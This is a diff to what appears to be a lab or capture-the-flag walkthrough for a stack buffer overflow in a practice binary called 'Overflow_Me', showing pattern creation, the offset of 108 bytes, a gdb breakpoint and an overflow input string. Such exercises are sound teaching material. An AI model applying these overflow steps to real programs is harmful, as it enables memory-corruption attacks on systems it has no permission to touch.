@@ -22,7 +22,7 @@
     - pattern create 150![Alt Text](img/pattern.png)<br />
 
   - Run the binary with that pattern
-    - ./Overflow_Me![Alt Text](img/find_pattern.png)<br />
+    - ./Overflow_Me![Alt Text](img/find_pattern.png)<br />The value output address is value overwite in eax.
 
   - Finally find the offset
     - pattern offset 0x41366441 150![Alt Text](img/offset.png)<br />The offset is **108**.
@@ -37,7 +37,7 @@
     - b *0x41366441![Alt Text](img/break_lev.png)<br />
   - Run the binary
     - run the binary with 108 byte of A ,comparsion value is 7313 and 8 byte of B and C .
-      - run < "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7313BBBBBBBBCCCCCCCC"
+      > run < "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7313BBBBBBBBCCCCCCCC"
     - Hey, Now the breakpoint is hit.
     - List the value in rbp.
       - x/20wx $rbp![Alt Text](img/rbp.png)<br />
